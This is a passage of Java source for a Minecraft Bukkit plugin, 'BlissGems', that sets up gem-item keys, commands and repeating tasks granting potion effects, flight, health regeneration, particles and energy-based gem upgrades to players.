package com.itsundefined.blissgems;





import net.citizensnpcs.api.CitizensAPI;
import net.citizensnpcs.api.trait.trait.Equipment;
import net.md_5.bungee.api.ChatMessageType;
import net.md_5.bungee.api.chat.TextComponent;
import org.bukkit.*;
import org.bukkit.attribute.Attribute;
import org.bukkit.attribute.AttributeInstance;
import org.bukkit.block.BlockState;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.TabCompleter;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.event.player.PlayerDropItemEvent;
import org.bukkit.entity.Husk;
import org.bukkit.attribute.AttributeModifier;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.block.Block;
import org.bukkit.entity.ArmorStand;
import org.bukkit.entity.EntityType;
import org.bukkit.entity.*;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.Action;
import org.bukkit.event.block.BlockBreakEvent;
import org.bukkit.event.block.BlockPlaceEvent;
import org.bukkit.event.entity.*;
import org.bukkit.inventory.*;
import org.bukkit.util.EulerAngle;
import org.bukkit.event.inventory.InventoryAction;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.inventory.InventoryCloseEvent;
import org.bukkit.event.inventory.InventoryType;
import org.bukkit.event.player.*;
import org.bukkit.scoreboard.Objective;

import org.bukkit.scoreboard.Score;
import org.bukkit.scoreboard.Scoreboard;
import org.bukkit.scoreboard.ScoreboardManager;
import org.bukkit.entity.Fireball;
import org.bukkit.event.entity.EntitySpawnEvent;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.inventory.meta.SkullMeta;
import org.bukkit.metadata.FixedMetadataValue;
import org.bukkit.persistence.PersistentDataContainer;
import org.bukkit.persistence.PersistentDataType;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;
import org.bukkit.potion.PotionEffect;
import org.bukkit.potion.PotionEffectType;
import org.bukkit.scheduler.BukkitTask;
import org.bukkit.util.Vector;
import org.bukkit.boss.BarColor;
import org.bukkit.boss.BarStyle;
import org.bukkit.boss.BossBar;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.entity.Player;
import net.citizensnpcs.api.event.NPCDamageByEntityEvent;
import net.citizensnpcs.api.npc.NPC;
import org.bukkit.projectiles.ProjectileSource;
import org.bukkit.entity.EntityType;
import org.bukkit.event.HandlerList;



import java.awt.Color;
import java.io.File;
import java.io.IOException;
import java.util.*;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.UUID;
import org.bukkit.configuration.file.FileConfiguration;
import org.spigotmc.event.entity.EntityDismountEvent;
import org.spigotmc.event.entity.EntityMountEvent;

import org.mineacademy.fo.plugin.SimplePlugin;
import javax.swing.*;
import javax.swing.text.Style;
import java.util.stream.Collectors;


public final class BlissGems extends SimplePlugin implements Listener {
    private BossBar bossBar;
    private Horse DimensionalDriftHorse = null;
    private int bossBarDuration = 80; // Duration in seconds
    private static final UUID DAGGERS_UUID = UUID.fromString("00000000-0000-0000-0000-000000000000");
    private final NamespacedKey UNFORTUNATE = new NamespacedKey(this, "Unfortunate");
    private final NamespacedKey UNFORTUNATE_KEY = new NamespacedKey(this, "Unfortunate");
    private NamespacedKey SᴛʀᴇɴɢᴛʜCɪʀᴄʟᴇ;
    private NamespacedKey SᴘᴇᴇᴅCɪʀᴄʟᴇ;
    private NamespacedKey LɪғᴇCɪʀᴄʟᴇ;
    private NamespacedKey WᴇᴀʟᴛʜCɪʀᴄʟᴇ;
    private NamespacedKey PᴜғғCɪʀᴄʟᴇ;
    private NamespacedKey FʟᴜxCɪʀᴄʟᴇ;
    private NamespacedKey Daggers;
    private NamespacedKey FireBall;
    private NamespacedKey Disabled_Gem;
    private NamespacedKey StrengthLine;
    private NamespacedKey SpeedLine;
    private NamespacedKey LifeLine;
    private NamespacedKey WealthLine;
    private NamespacedKey PuffLine;
    private NamespacedKey CʜᴀᴅSᴛʀᴇɴɢᴛʜ;
    private NamespacedKey Speed_Storm_Circle;
    private NamespacedKey ChadStrengthParticleCase1;
    private NamespacedKey ChadStrengthParticleCase2;
    private NamespacedKey ChadStrengthParticleCase3;
    private NamespacedKey ChadStrengthParticleCase4;
    private NamespacedKey DᴏᴜʙʟᴇJᴜᴍᴘ;
    private NamespacedKey CɪʀᴄʟᴇOғLɪғᴇ;
    private NamespacedKey Unfortunate;
    private NamespacedKey RɪᴄʜRᴜsʜ;
    private NamespacedKey Dash;
    private NamespacedKey Dᴀɢɢᴇʀs;
    private NamespacedKey CɪʀᴄʟᴇOғLɪғᴇVɪᴄᴛɪᴍ;
    private NamespacedKey Cozy_Campfire;
    private NamespacedKey CʜᴀᴅSᴛʀᴇɴɢᴛʜPᴀʀᴛɪᴄʟᴇs;
    private NamespacedKey TᴇʀᴍɪɴᴀʟVᴇʟᴏᴄɪᴛʏ;
    private final List<String> LifeGemDamage = Arrays.asList("ZOMBIE", "SKELETON", "WITHER_SKELETON", "HUSK", "DROWNED");
    private NamespacedKey FɪʀsᴛJᴏɪɴ;
    private NamespacedKey BʟɪssEɴᴇʀɢʏ_12;
    private NamespacedKey BʟɪssEɴᴇʀɢʏ_11;
    private NamespacedKey BʟɪssEɴᴇʀɢʏ_10;
    private NamespacedKey BʟɪssEɴᴇʀɢʏ_9;
    private NamespacedKey BʟɪssEɴᴇʀɢʏ_8;
    private NamespacedKey BʟɪssEɴᴇʀɢʏ_7;
    private NamespacedKey BʟɪssEɴᴇʀɢʏ_6;
    private NamespacedKey BʟɪssEɴᴇʀɢʏ_5;
    private NamespacedKey BʟɪssEɴᴇʀɢʏ_4;
    private NamespacedKey BʟɪssEɴᴇʀɢʏ_3;
    private NamespacedKey BʟɪssEɴᴇʀɢʏ_2;
    private NamespacedKey BʟɪssEɴᴇʀɢʏ_1;
    private NamespacedKey TᴇʀᴍɪɴᴀʟVᴇʟᴏᴄɪᴛʏCᴏᴏʟᴅᴏᴡɴ;
    private NamespacedKey BlissParticlesLess;
    private NamespacedKey BlissParticlesDefault;
    private NamespacedKey AsᴛʀᴀʟPʀᴏᴊᴇᴄᴛɪᴏɴPᴀʀᴛɪᴄʟᴇs;
    private NamespacedKey Cʀᴏᴜᴄʜɪɴɢ_Oɴ_Cʀᴏᴘ;
    private NamespacedKey Uɴʙᴏᴜɴᴅ;
    private NamespacedKey FɪʀᴇBᴀʟʟ;
    private NamespacedKey FɪʀᴇBᴀʟʟCʜᴀʀɢɪɴɢPᴀʀᴛɪᴄʟᴇs;
    private NamespacedKey Dimensional_Drift;
    private BukkitRunnable particleTask;
    private BukkitRunnable teleportTask;
    private JavaPlugin plugin;
    private Random random;
    private final Map<UUID, ArmorStand[]> armorStands = new HashMap<>();
    private final Map<Player, BossBar> playerBossBars = new HashMap<>();
    private final Map<Integer, PotionEffect[]> Tier1CustomModelDataEffects = new HashMap<>();
    private final Map<Integer, PotionEffect[]> Tier2CustomModelDataEffects = new HashMap<>();
    private final Map<UUID, Map.Entry<ArmorStand, BossBar>> FireBallChargingFireGem = new HashMap<>();
    private File dataFile;
    private FileConfiguration dataConfig;
    private Player playerKillHandler;
    private Map<UUID, Long> StrengthGem_Power_1_StrengthCircle = new HashMap<>();
    private Map<UUID, Long> StrengthGem_Power_2_Enchanting = new HashMap<>();
    private Map<UUID, Long> StrengthGem_Power_3_ChadStrength = new HashMap<>();
    private Map<UUID, Long> StrengthGem_Power_8_ChadStrength = new HashMap<>();
    private Map<UUID, Long> SpeedGem_Power_1_SpeedCircle = new HashMap<>();
    private Map<UUID, Long> SpeedGem_Power_2_Enchanting = new HashMap<>();
    private Map<UUID, Long> SpeedGem_Power_3_SpeedStormCircle = new HashMap<>();
    private Map<UUID, Long> LifeGem_Power_1_LifeCircle = new HashMap<>();
    private Map<UUID, Long> LifeGem_Power_2_Enchanting = new HashMap<>();
    private Map<UUID, Long> LifeGem_Power_3_CircleOfLife = new HashMap<>();
    private Map<UUID, Long> WealthGem_Power_1_WealthCircle = new HashMap<>();
    private Map<UUID, Long> WealthGem_Power_2_Enchanting = new HashMap<>();
    private Map<UUID, Long> WealthGem_Power_3_RichRush = new HashMap<>();
    private Map<UUID, Long> PuffGem_Power_1_PuffCircle = new HashMap<>();
    private Map<UUID, Long> PuffGem_Power_2_Enchanting = new HashMap<>();
    private Map<UUID, Long> PuffGem_Power_3_Dash = new HashMap<>();
    private Map<UUID, Long> AstraGem_Power_1_Daggers = new HashMap<>();
    private Map<UUID, Long> AstraGem_Power_2_SoulCapture = new HashMap<>();
    private Map<UUID, Long> AstraGem_Power_3_AstralProjection = new HashMap<>();
    private Map<UUID, Long> AstraGem_Power_4_DimensionalDrift = new HashMap<>();
    private Map<UUID, Long> FireGem_Power_1_FireBall = new HashMap<>();
    private Map<UUID, Long> FireGem_Power_2_Enchanting = new HashMap<>();
    private Map<UUID, Long> FireGem_Power_3_CozyCampfire = new HashMap<>();
    private Map<UUID, Long> FluxGem_Power_2_FluxBurst = new HashMap<>();
    private BukkitTask speedTask;
    private Map<UUID, BukkitTask> particleTasks = new HashMap<>();
    private HashMap<UUID, Integer> BlissGemHEalth;
    private HashMap<UUID, ArmorStand> dagger1Map;
    private HashMap<UUID, ArmorStand> dagger2Map;
    private final Map<UUID, Double> damageAbsorbedMap = new HashMap<>();
    private Map<UUID, Long> critCooldown = new HashMap<>();
    private final Map<UUID, Husk> AstralProjectionHit = new HashMap<>();
    private final Map<UUID, Boolean> isHoldingShard = new HashMap<>();
    private HashMap<UUID, Double> HeartDrainerHearts = new HashMap<>();
    private static final int COOLDOWN_TIME = 10; // Cooldown time in seconds
    private final Map<Player, List<ArmorStand>> playerArmorStandsMap = new HashMap<>();
    private final Map<UUID, BukkitTask> bossBarTimers = new HashMap<>();
    private Map<UUID, Long> lastRightClickTime = new HashMap<>();
    private final Map<Player, Location> itemLocations = new HashMap<>();
    private final Map<UUID, Long> lastClickTimeMap = new HashMap<>();
    private Map<UUID, BukkitRunnable> CircleOfLife = new HashMap<>();
    private HashMap<UUID, Integer> particleLevels = new HashMap<>();
    private final HashMap<UUID, Integer> BlissGemHealth = new HashMap<>();
    private final Map<UUID, Integer> minedBlocks = new HashMap<>();
    private final HashMap<Player, Integer> playerScores = new HashMap<>();
    private final Map<UUID, Integer> hasteTaskIds = new HashMap<>();
    private final Map<UUID, Integer> particleCase = new HashMap<>();
    private BukkitTask task;
    private final Map<UUID, Long> lastCriticalHitTime = new HashMap<>();
    private final Map<UUID, Long> lastClickTime = new HashMap<>();
    private Map<Player, String> ShadowStalkerPlayerHeadNames = new HashMap<>();
    private final Map<UUID, Integer> testDouble = new HashMap<>();
    private final Map<UUID, Integer> chadStrength = new HashMap<>();
    private static final long TRANSFORMATION_DELAY = 200L;
    private static final Map<UUID, String> GiftedItems = new HashMap<>();
    public final Map<UUID, Inventory> WealthGemPocketsInventory = new HashMap<>();
    private final Map<UUID, Location> AstraGemSouldCaptureEntityDeath = new HashMap<>();
    private File inventoryFile;
    private FileConfiguration inventoryConfig;
    private final Map<UUID, Integer> playerLives = new HashMap<>();
    private final Map<UUID, ItemStack[]> savedInventories = new HashMap<>();
    private final Map<UUID, ItemStack[]> savedArmor = new HashMap<>();
    private final Map<UUID, Husk> playerHusks = new HashMap<>();
    private Map<UUID, BukkitRunnable> cooldownTimers = new HashMap<>();
    private HashMap<UUID, Entity> spectatingEntities = new HashMap<>();
    private HashMap<UUID, NPC> npcClones = new HashMap<>();
    private Map<Player, ItemStack> playerItemsPlaced = new HashMap<>();
    private Map<Player, Player> playerHeadMap = new HashMap<>();
    private final Map<UUID, Long> lastJumpTimes = new HashMap<>();
    private final Map<UUID, Boolean> flyingPlayers = new HashMap<>();
    private final Map<UUID, Long> lastCritTime = new HashMap<>();
    private final Map<UUID, Integer> ChadStrengthCritical = new HashMap<>();
    private final HashMap<UUID, Boolean> chadStrengthActive = new HashMap<>();
    private Map<Player, Player> playerHeadOwners;
    private final Map<UUID, BukkitRunnable> messageTasks = new HashMap<>();
    private HashMap<UUID, Integer> critCount = new HashMap<>();
    private final Map<UUID, Integer> chadStrengthParticles = new HashMap<>();
    private boolean isFollowing = false;
    private final Map<UUID, Integer> ChadStrengthParticleCounters = new HashMap<>();
    private double LifeGemDamageAbility = 1.0;
    private HashMap<UUID, Integer> criticalHitCount = new HashMap<>();
    private ArmorStand armorStand;
    private final String targetPlayerName = "ITsUndefined_";
    private Player player;



    @Override
    public void onPluginStart() {
        // Plugin startup logic
        getCommand("bliss").setExecutor(new Bliss());
        getCommand("menu").setExecutor(new SlashMenu());
        getCommand("bliss").setExecutor(new SlashBliss());
        getCommand("bliss").setTabCompleter(new SlashBliss());
        Bukkit.getPluginManager().registerEvents(this, this);
        getServer().getPluginManager().registerEvents(this, this);
        getServer().getPluginManager().registerEvents(new SlashMenu(), this);
        new GemEffects().runTaskTimer(this, 0, 1);
        System.out.println("BlissGems version 1.2.3");
        System.out.println("Bliss by Pro4D/aglerr/ITsUndefined_");
        System.out.println("Authors: aglerr and Pro4D");
        System.out.println("Remakers: ITsUndefined_");
        SᴛʀᴇɴɢᴛʜCɪʀᴄʟᴇ = new NamespacedKey(this, "STRENGTH_CIRCLE");
        SᴘᴇᴇᴅCɪʀᴄʟᴇ = new NamespacedKey(this, "SPEED_CIRCLE");
        LɪғᴇCɪʀᴄʟᴇ = new NamespacedKey(this, "LIFE_CIRCLE");
        WᴇᴀʟᴛʜCɪʀᴄʟᴇ = new NamespacedKey(this, "WEALTH_CIRCLE");
        PᴜғғCɪʀᴄʟᴇ = new NamespacedKey(this, "PUFF_CIRCLE");
        FʟᴜxCɪʀᴄʟᴇ = new NamespacedKey(this, "FLUX_CIRCLE");
        FireBall = new NamespacedKey(this, "FIREBALL");
        Daggers = new NamespacedKey(this, "DAGGERS");
        Disabled_Gem = new NamespacedKey(this, "DISABLED_GEM");
        StrengthLine = new NamespacedKey(this, "STRENGTH_LINE");
        SpeedLine = new NamespacedKey(this, "SPEED_LINE");
        LifeLine = new NamespacedKey(this, "LIFE_LINE");
        WealthLine = new NamespacedKey(this, "WEALTH_LINE");
        PuffLine = new NamespacedKey(this, "PUFF_LINE");
        CʜᴀᴅSᴛʀᴇɴɢᴛʜ = new NamespacedKey(this, "CHAD_STRENGTH");
        Speed_Storm_Circle = new NamespacedKey(this, "SPEED_STORM_CIRCLE");
        CɪʀᴄʟᴇOғLɪғᴇ = new NamespacedKey(this, "CIRCLE_OF_LIFE");
        Unfortunate = new NamespacedKey(this, "UNFORTUNATE");
        DᴏᴜʙʟᴇJᴜᴍᴘ = new NamespacedKey(this, "DoubleJump");
        RɪᴄʜRᴜsʜ = new NamespacedKey(this, "RICH_RUSH");
        FɪʀsᴛJᴏɪɴ = new NamespacedKey(this, "FIRST_JOIN");
        CɪʀᴄʟᴇOғLɪғᴇVɪᴄᴛɪᴍ = new NamespacedKey(this, "CIRCLE_OF_LIFE_VICTIM");
        Dash = new NamespacedKey(this, "DASH");
        Cozy_Campfire = new NamespacedKey(this, "COZYCAMPFIRE");
        Dimensional_Drift = new NamespacedKey(this, "DIMENSIONAL_DRIFT");
        BʟɪssEɴᴇʀɢʏ_12 = new NamespacedKey(this, "BlissGemHealth.12");
        BʟɪssEɴᴇʀɢʏ_11 = new NamespacedKey(this, "BlissGemHealth.11");
        BʟɪssEɴᴇʀɢʏ_10 = new NamespacedKey(this, "BlissGemHealth.10");
        BʟɪssEɴᴇʀɢʏ_9 = new NamespacedKey(this, "BlissGemHealth.9");
        BʟɪssEɴᴇʀɢʏ_8 = new NamespacedKey(this, "BlissGemHealth.8");
        BʟɪssEɴᴇʀɢʏ_7 = new NamespacedKey(this, "BlissGemHealth.7");
        BʟɪssEɴᴇʀɢʏ_6 = new NamespacedKey(this, "BlissGemHealth.6");
        BʟɪssEɴᴇʀɢʏ_5 = new NamespacedKey(this, "BlissGemHealth.5");
        BʟɪssEɴᴇʀɢʏ_4 = new NamespacedKey(this, "BlissGemHealth.4");
        BʟɪssEɴᴇʀɢʏ_3 = new NamespacedKey(this, "BlissGemHealth.3");
        BʟɪssEɴᴇʀɢʏ_2 = new NamespacedKey(this, "BlissGemHealth.2");
        BʟɪssEɴᴇʀɢʏ_1 = new NamespacedKey(this, "BlissGemHealth.1");
        TᴇʀᴍɪɴᴀʟVᴇʟᴏᴄɪᴛʏCᴏᴏʟᴅᴏᴡɴ = new NamespacedKey(this, "TerminalVelocityCooldown");
        FɪʀᴇBᴀʟʟ = new NamespacedKey(this, "FireBall");
        Dᴀɢɢᴇʀs = new NamespacedKey(this, "DaggersFired");
        TᴇʀᴍɪɴᴀʟVᴇʟᴏᴄɪᴛʏ = new NamespacedKey(this, "TerminalVelocity");
        FɪʀᴇBᴀʟʟCʜᴀʀɢɪɴɢPᴀʀᴛɪᴄʟᴇs = new NamespacedKey(this, "FireBallChargingParticles");
        Uɴʙᴏᴜɴᴅ = new NamespacedKey(this, "UNBOUND");
        BlissParticlesLess = new NamespacedKey(this, "BlissParticleLevel.2");
        BlissParticlesDefault = new NamespacedKey(this, "BlissParticleLevel.3");
        CʜᴀᴅSᴛʀᴇɴɢᴛʜPᴀʀᴛɪᴄʟᴇs = new NamespacedKey(this, "CHAD_STRENGTH_PARTICLES");
        AsᴛʀᴀʟPʀᴏᴊᴇᴄᴛɪᴏɴPᴀʀᴛɪᴄʟᴇs = new NamespacedKey(this, "ASTRAL_PROJECTION_PARTICLES");
        ChadStrengthParticleCase4 = new NamespacedKey(this, "ChadStrengthParticleCase.4");
        ChadStrengthParticleCase3 = new NamespacedKey(this, "ChadStrengthParticleCase.3");
        ChadStrengthParticleCase2 = new NamespacedKey(this, "ChadStrengthParticleCase.2");
        ChadStrengthParticleCase1 = new NamespacedKey(this, "ChadStrengthParticleCase.1");
        Cʀᴏᴜᴄʜɪɴɢ_Oɴ_Cʀᴏᴘ = new NamespacedKey(this, "CROUCHING_ON_CROP");
        getCommand("cooldown").setTabCompleter(this);
        bossBar = Bukkit.createBossBar("Boss Bar Title", BarColor.RED, BarStyle.SOLID);
        bossBar.setProgress(0.0);
        dataFile = new File(getDataFolder(), "player_scores.yml");
        if (!dataFile.exists()) {
            dataFile.getParentFile().mkdirs();
            try {
                dataFile.createNewFile();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        dataConfig = YamlConfiguration.loadConfiguration(dataFile);
        EnergyScoreLoad(dataConfig);
        new BukkitRunnable() {
            @Override
            public void run() {
                for (Player player : Bukkit.getOnlinePlayers()) {
                    ItemStack MainHandItem = player.getInventory().getItemInMainHand();
                    ItemStack OffHandItem = player.getInventory().getItemInOffHand();
                    if (StrengthGem(MainHandItem) || StrengthGem(OffHandItem)) {
                        player.addPotionEffect(new PotionEffect(PotionEffectType.INCREASE_DAMAGE, 40, 1, true, false), true);
                    }
                    if (SpeedGem(MainHandItem) || SpeedGem(OffHandItem)) {
                        player.addPotionEffect(new PotionEffect(PotionEffectType.SPEED, 40, 2, true, false), true);
                        player.addPotionEffect(new PotionEffect(PotionEffectType.DOLPHINS_GRACE, 40, 0, true, false), true);
                    }
                    if (WealthGem(MainHandItem) || WealthGem(OffHandItem)) {
                        player.addPotionEffect(new PotionEffect(PotionEffectType.HERO_OF_THE_VILLAGE, 40, 1, true, false), true);
                        player.addPotionEffect(new PotionEffect(PotionEffectType.LUCK, 40, 1, true, false), true);
                    }
                    if (FireGem(MainHandItem) || FireGem(OffHandItem) || Firegem(MainHandItem) || Firegem(OffHandItem)) {
                        player.addPotionEffect(new PotionEffect(PotionEffectType.FIRE_RESISTANCE, 40, 0, true, false), true);
                    }
                    if (Strengthgem(MainHandItem) || Strengthgem(OffHandItem)) {
                        player.addPotionEffect(new PotionEffect(PotionEffectType.INCREASE_DAMAGE, 40, 0, true, false), true);
                    }
                    if (Speedgem(MainHandItem) || Speedgem(OffHandItem)) {
                        player.addPotionEffect(new PotionEffect(PotionEffectType.SPEED, 40, 1, true, false), true);
                    }
                    if (Wealthgem(MainHandItem) || Wealthgem(OffHandItem)) {
                        player.addPotionEffect(new PotionEffect(PotionEffectType.HERO_OF_THE_VILLAGE, 40, 0, true, false), true);
                        player.addPotionEffect(new PotionEffect(PotionEffectType.LUCK, 40, 0, true, false), true);
                    }
                    if (LifeGem(MainHandItem) || LifeGem(OffHandItem)) {
                        PersistentDataContainer data = player.getPersistentDataContainer();
                        data.remove(Cʀᴏᴜᴄʜɪɴɢ_Oɴ_Cʀᴏᴘ);
                    }
                    if (!player.getPersistentDataContainer().has(DᴏᴜʙʟᴇJᴜᴍᴘ, PersistentDataType.INTEGER) && PuffGem(MainHandItem) || PuffGem(OffHandItem) || Puffgem(MainHandItem) || Puffgem(OffHandItem)) {
                        player.setAllowFlight(true);
                    } else {
                        if (player.getGameMode() == GameMode.SURVIVAL) {
                            player.setAllowFlight(false);
                        }
                    }
                }
            }
        }.runTaskTimer(this, 0, 20);
        new BukkitRunnable() {
            @Override
            public void run() {
                for (Player BloodThornsPlayer : Bukkit.getOnlinePlayers()) {
                    ItemStack StrengthGemItem = BloodThornsPlayer.getInventory().getItemInOffHand();
                    if (StrengthGem(StrengthGemItem)) {
                        double health = BloodThornsPlayer.getHealth();
                        AttributeInstance BloodThornsAttribute = BloodThornsPlayer.getAttribute(Attribute.GENERIC_ATTACK_DAMAGE);
                        if (BloodThornsAttribute != null) {
                            if (health >= 0.5 && health < 1) {
                                BloodThornsAttribute.setBaseValue(8.0);
                            } else if (health >= 1 && health < 1.5) {
                                BloodThornsAttribute.setBaseValue(8.0);
                            } else if (health >= 1.5 && health < 2) {
                                BloodThornsAttribute.setBaseValue(8.0);
                            } else if (health >= 2 && health < 2.5) {
                                BloodThornsAttribute.setBaseValue(8.0);
                            } else if (health >= 2.5 && health < 3) {
                                BloodThornsAttribute.setBaseValue(8.0);
                            } else if (health >= 3 && health < 3.5) {
                                BloodThornsAttribute.setBaseValue(8.0);
                            } else if (health >= 3.5 && health < 4) {
                                BloodThornsAttribute.setBaseValue(8.0);
                            } else if (health >= 4 && health < 4.5) {
                                BloodThornsAttribute.setBaseValue(8.0);
                            } else if (health >= 4.5 && health < 5) {
                                BloodThornsAttribute.setBaseValue(8.0);
                            } else if (health >= 5.5 && health < 6) {
                                BloodThornsAttribute.setBaseValue(8.0);
                            } else if (health >= 6 && health < 6.5) {
                                BloodThornsAttribute.setBaseValue(5.5);
                            } else if (health >= 6.5 && health < 8) {
                                BloodThornsAttribute.setBaseValue(5.0);
                            } else if (health >= 8 && health < 8.5) {
                                BloodThornsAttribute.setBaseValue(4.5);
                            } else if (health >= 8.5 && health < 10) {
                                BloodThornsAttribute.setBaseValue(3.5);
                            } else if (health >= 10 && health < 10.5) {
                                BloodThornsAttribute.setBaseValue(3.0);
                            } else if (health >= 10.5 && health < 12) {
                                BloodThornsAttribute.setBaseValue(2.5);
                            } else if (health >= 12 && health < 12.5) {
                                BloodThornsAttribute.setBaseValue(2.0);
                            } else if (health >= 12.5 && health < 13) {
                                BloodThornsAttribute.setBaseValue(1.5);
                            } else {
                                BloodThornsAttribute.setBaseValue(1.0);
                            }
                        }
                    }
                }
            }
        }.runTaskTimer(this, 0, 1);
        new BukkitRunnable() {
            @Override
            public void run() {
                for (Player player : Bukkit.getOnlinePlayers()) {
                    ItemStack MainHandItem = player.getInventory().getItemInMainHand();
                    ItemStack OffHandItem = player.getInventory().getItemInOffHand();
                    if (LifeGem(MainHandItem) || LifeGem(OffHandItem)) {
                        double currentHealth = player.getHealth();
                        currentHealth = currentHealth + 1;
                        player.setHealth(currentHealth);
                    }
                }
            }
        }.runTaskTimer(this, 0, 100);
        new BukkitRunnable() {
            @Override
            public void run() {
                for (Player player : Bukkit.getOnlinePlayers()) {
                    Location eyeLocation = player.getEyeLocation().add(0, -0.3, 0);
                    Location ChadStrengthParticleFrontLocation = eyeLocation.clone().add(eyeLocation.getDirection().normalize().multiply(0.4));
                    Location ChadStrengthParticleLeftLocation = eyeLocation.clone().add(eyeLocation.getDirection().normalize().rotateAroundY(Math.toRadians(-50)).multiply(0.5));
                    Location ChadStrengthParticleRightLocation = eyeLocation.clone().add(eyeLocation.getDirection().normalize().rotateAroundY(Math.toRadians(50)).multiply(0.5));
                    Particle.DustOptions BlissParticlesOption = new Particle.DustOptions(org.bukkit.Color.fromRGB(241, 3, 3), 1);
                    if (player.getPersistentDataContainer().has(ChadStrengthParticleCase1, PersistentDataType.INTEGER)) {
                        player.getWorld().spawnParticle(Particle.SMOKE_NORMAL, ChadStrengthParticleFrontLocation, 1, 0, 0, 0, 0);
                        player.getWorld().spawnParticle(Particle.SMOKE_NORMAL, ChadStrengthParticleLeftLocation, 1, 0, 0, 0, 0);
                        player.getWorld().spawnParticle(Particle.SMOKE_NORMAL, ChadStrengthParticleRightLocation, 1, 0, 0, 0, 0);
                    }
                    if (player.getPersistentDataContainer().has(ChadStrengthParticleCase2, PersistentDataType.INTEGER)) {
                        player.getWorld().spawnParticle(Particle.SMOKE_NORMAL, ChadStrengthParticleFrontLocation, 1, 0, 0, 0, 0);
                        player.getWorld().spawnParticle(Particle.REDSTONE, ChadStrengthParticleLeftLocation, 1, 0, 0, 0, 0, BlissParticlesOption);
                        player.getWorld().spawnParticle(Particle.SMOKE_NORMAL, ChadStrengthParticleRightLocation, 1, 0, 0, 0, 0);
                    }
                    if (player.getPersistentDataContainer().has(ChadStrengthParticleCase3, PersistentDataType.INTEGER)) {
                        player.getWorld().spawnParticle(Particle.REDSTONE, ChadStrengthParticleFrontLocation, 1, 0, 0, 0, 0, BlissParticlesOption);
                        player.getWorld().spawnParticle(Particle.REDSTONE, ChadStrengthParticleLeftLocation, 1, 0, 0, 0, 0, BlissParticlesOption);
                        player.getWorld().spawnParticle(Particle.SMOKE_NORMAL, ChadStrengthParticleRightLocation, 1, 0, 0, 0, 0);
                    }
                    if (player.getPersistentDataContainer().has(ChadStrengthParticleCase4, PersistentDataType.INTEGER)) {
                        player.getWorld().spawnParticle(Particle.REDSTONE, ChadStrengthParticleFrontLocation, 1, 0, 0, 0, 0, BlissParticlesOption);
                        player.getWorld().spawnParticle(Particle.REDSTONE, ChadStrengthParticleLeftLocation, 1, 0, 0, 0, 0, BlissParticlesOption);
                        player.getWorld().spawnParticle(Particle.REDSTONE, ChadStrengthParticleRightLocation, 1, 0, 0, 0, 0, BlissParticlesOption);
                    }
                    UUID killerUUID = player.getUniqueId();
                    int currentScore = BlissEnergyGemHealth.getOrDefault(killerUUID, 0);
                    Inventory inventory = player.getInventory();
                    for (int i = 0; i < inventory.getSize(); i++) {
                        ItemStack item = inventory.getItem(i);
                        if (item != null && item.getType() == Material.PRISMARINE_SHARD) {
                            ItemMeta itemMeta = item.getItemMeta();
                            if (itemMeta != null && item.hasItemMeta() && ChatColor.stripColor(item.getItemMeta().getDisplayName()).equals("sᴛʀᴇɴɢᴛʜ ɢᴇᴍ")) {
                                if (currentScore == 3) {
                                    inventory.setItem(i, StrengthGemRuined(1));
                                }
                                if (currentScore == 6) {
                                    inventory.setItem(i, StrengthGemDamaged(2));
                                }
                                if (currentScore == 9) {
                                    inventory.setItem(i, StrengthGemCracked(3));
                                }
                                if (currentScore == 12) {
                                    inventory.setItem(i, StrengthGemScratched(4));
                                }
                                if (currentScore == 15) {
                                    inventory.setItem(i, StrengthGemPristine(5));
                                }
                                if (currentScore == 18) {
                                    inventory.setItem(i, StrengthGemPristinePlus(6));
                                }
                                if (currentScore == 21) {
                                    inventory.setItem(i, StrengthGemPristine1(7));
                                }
                                if (currentScore == 24) {
                                    inventory.setItem(i, StrengthGemPristine2(8));
                                }
                                if (currentScore == 27) {
                                    inventory.setItem(i, StrengthGemPristine3(9));
                                }
                                if (currentScore == 30) {
                                    inventory.setItem(i, StrengthGemPristine4(10));
                                }
                                if (currentScore == 33) {
                                    inventory.setItem(i, StrengthGemPristine5(11));
                                }
                            }
                            if (itemMeta != null && item.hasItemMeta() && ChatColor.stripColor(item.getItemMeta().getDisplayName()).equals("sᴘᴇᴇᴅ ɢᴇᴍ")) {
                                if (currentScore == 3) {
                                    inventory.setItem(i, SpeedGemRuined(1));
                                }
                                if (currentScore == 6) {
                                    inventory.setItem(i, SpeedGemDamaged(2));
                                }
                                if (currentScore == 9) {
                                    inventory.setItem(i, SpeedGemCracked(3));
                                }
                                if (currentScore == 12) {
                                    inventory.setItem(i, SpeedGemScratched(4));
                                }
                                if (currentScore == 15) {
                                    inventory.setItem(i, SpeedGemPristine(5));
                                }
                                if (currentScore == 18) {
                                    inventory.setItem(i, SpeedGemPristinePlus(6));
                                }
                                if (currentScore == 21) {
                                    inventory.setItem(i, SpeedGemPristine1(7));
                                }
                                if (currentScore == 24) {
                                    inventory.setItem(i, SpeedGemPristine2(8));
                                }
                                if (currentScore == 27) {
                                    inventory.setItem(i, SpeedGemPristine3(9));
                                }
                                if (currentScore == 30) {
                                    inventory.setItem(i, SpeedGemPristine4(10));
                                }
                                if (currentScore == 33) {
                                    inventory.setItem(i, SpeedGemPristine5(11));
                                }
                            }
                            if (itemMeta != null && item.hasItemMeta() && ChatColor.stripColor(item.getItemMeta().getDisplayName()).equals("ᴡᴇᴀʟᴛʜ ɢᴇᴍ")) {
                                if (currentScore == 3) {
                                    inventory.setItem(i, WealthGemRuined(1));
                                }
                                if (currentScore == 6) {
                                    inventory.setItem(i, WealthGemDamaged(2));
                                }
                                if (currentScore == 9) {
                                    inventory.setItem(i, WealthGemCracked(3));
                                }
                                if (currentScore == 12) {
                                    inventory.setItem(i, WealthGemScratched(4));
                                }
                                if (currentScore == 15) {
                                    inventory.setItem(i, WealthGemPristine(5));
                                }
                                if (currentScore == 18) {
                                    inventory.setItem(i, WealthGemPristinePlus(6));
                                }
                                if (currentScore == 21) {
